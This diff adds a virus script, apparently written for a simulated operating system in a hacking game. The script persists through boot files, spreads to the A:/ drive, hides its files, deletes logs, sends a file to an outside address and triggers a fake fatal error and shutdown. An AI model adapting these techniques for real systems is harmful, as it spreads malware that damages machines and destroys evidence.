@@ -1,0 +1,152 @@
+id;n
+getfile;nn;"/tmp/record.vcl
+id;nn;==;null;n
+set;e;"rename /tmp/record.vcl 
+shell;"timer  
+eval;e;+=;err_level
+shell;e
+goto;n
+
+
+
+
+
+
+char;sim;"59
+replacetext;e1;"copy /tmp/hello.update /sys|hide /sys/hello.update|rename /sys/hello.update drqwe.sys;"|;sim
+replacetext;e2;"copy /sys/drqwe.sys /tmp|rename /tmp/drqwe.sys hello.update|reveal /tmp/hello.update;"|;sim
+if;arg:"1;==;"drqwe;drqwe
+if;arg:"1;==;"drqwwe;drqwwe
+if;arg:"1;==;"spreada;spreada
+if;arg:"1;==;"infects;infects
+if;arg:"1;==;"live;live
+if;arg:"1;==;"sub;sub
+if;arg:"1;==;"arebit;arebit
+if;arg:"1;==;"secret;secret
+if;arg:"1;==;"sedd;sedd
+if;arg:"1;==;"logf;logf
+getfile;manifest;"/sys/drqwe.sys
+if;manifest;!=;null;pimp
+getfile;manifest;"/tmp/hello.update
+if;manifest;!=;null;pimping
+id;pimp
+end;nolive
+id;pimping
+shell;"echo updating..
+shell;e1
+goto;live
+id;sub
+getfile;manifest;"/sys/drqwe.sys
+if;manifest;==;null;revive
+end;subb
+id;revive
+shell;"copy /sys/registry/drqwe.sys /sys
+id;live
+replacetext;live;"back /sys/drqwe.sys drqwe|back /sys/drqwe.sys drqwwe|back /sys/drqwe.sys infects|back /sys/drqwe.sys spreada|back /sys/drqwe.sys arebit|back /sys/drqwe.sys secret|back /sys/drqwe.sys sedd|back /sys/drqwe.sys logf;"|;sim
+shell;live
+shell;"timer  
+set;mxz;err_level
+length;ssx;mxz
+copytext;mxd;mxz;ssx;ssx
+set;errorr;mxd
+eval;errorr;/=;"10
+eval;ssx;-=;"1
+copytext;mxd;mxz;ssx;ssx
+eval;errorr;+=;mxd
+eval;errorr;*=;"9
+set;infect;"begin
+id;drq
+if;infect;==;";nons
+if;errorr;<;"1;error
+id;nons
+eval;errorr;-=;"1
+dumpfile;"/sys/boot.sys;infect
+if;infect;==;";drq
+replacetext;infects;infect;"back /sys/drqwe.sys live;"
+if;infects;!=;infect;drq
+shell;"file_add /sys/boot.sys [semi]back /sys/drqwe.sys live
+goto;drq
+id;error
+getfile;manifest;"/tmp/hello.update
+if;manifest;!=;null;errornull
+shell;e2
+id;errornull
+shell;"send update 100.100.100.100.100 /tmp/hello.update
+eval;mxz;/=;"3
+set;b;"echo ~FATAL ERROR 0x
+eval;b;+=;mxz
+eval;b;+=;"~ -=.'
+shell;b
+shell;"shutdown
+id;infects
+getfile;manifest;"/sys/registry/drqwe.sys
+if;manifest;!=;null;infectss
+shell;"copy /bin/drqwe.sys /sys/registry/
+id;infectss
+dumpfile;"/sys/registry/write.com;infect
+if;infect;==;";infects
+replacetext;infects;infect;"back /sys/registry/drqwe.sys sub;"
+if;infects;!=;infect;infects
+shell;"file_add /sys/registry/write.com [semi]back /sys/registry/drqwe.sys sub
+goto;infects
+id;drqwe
+getfile;manifest;"/sys/drqwe.sys
+if;manifest;!=;null;drqwe
+shell;"copy /bin/drqwe.sys /sys
+goto;drqwe
+id;drqwwe
+getfile;manifest;"/bin/drqwe.sys
+if;manifest;!=;null;drqwwe
+shell;"copy /sys/drqwe.sys /bin
+goto;drqwwe
+id;spreada
+getfile;manifest;"A:/
+if;manifest;==;null;spreada
+getfile;manifest;"A:/drqwe.sys
+if;manifest;!=;null;spreada
+shell;"copy /sys/drqwe.sys A:/
+getfile;manifest;"A:/boot.sys
+if;manifest;!=;null;spreadb
+id;spreadr
+shell;"copy /sys/boot.sys A:/
+shell;"file_clear A:/boot.sys
+shell;"hide A:/boot.sys
+goto;spreade
+id;spreadb
+dumpfile;"A:/boot.sys;boot
+if;boot;==;"";spreade
+shell;"file_add A:/boot.sys [semi]
+id;spreade
+shell;"file_add A:/boot.sys copy A:/drqwe.sys /sys[semi]file_add /sys/boot.sys  
+getfile;boot;"A:/boot.sys
+eval;boot;+=;"[semi]back /sys/drqwe.sys live
+goto;spreada
+id;arebit
+getfile;up;"/tmp/hello.update
+if;up;!=;null;arebit
+shell;e2
+goto;arebit
+id;secret
+getfile;sys;"/sys/drqwe.sys
+getfile;bin;"/bin/drqwe.sys
+getfile;up;"/tmp/hello.update
+getfile;secret;"A:/drqwe.sys
+if;secret;==;null;secret
+if;sys;!=;null;secret
+if;bin;!=;null;secret
+if;usr;!=;null;secret
+if;up;!=;null;secret
+shell;"copy A:/drqwe.sys /sys
+goto;secret
+id;sedd
+getfile;sys;"/sys/drqwe.sys
+getfile;bin;"/bin/drqwe.sys
+if;sys;!=;null;sedd
+if;bin;!=;null;sedd
+shell;e1
+goto;sedd
+id;logf
+getfile;log;"/log
+if;log;==;null;logf
+shell;"del /log
+goto;logf
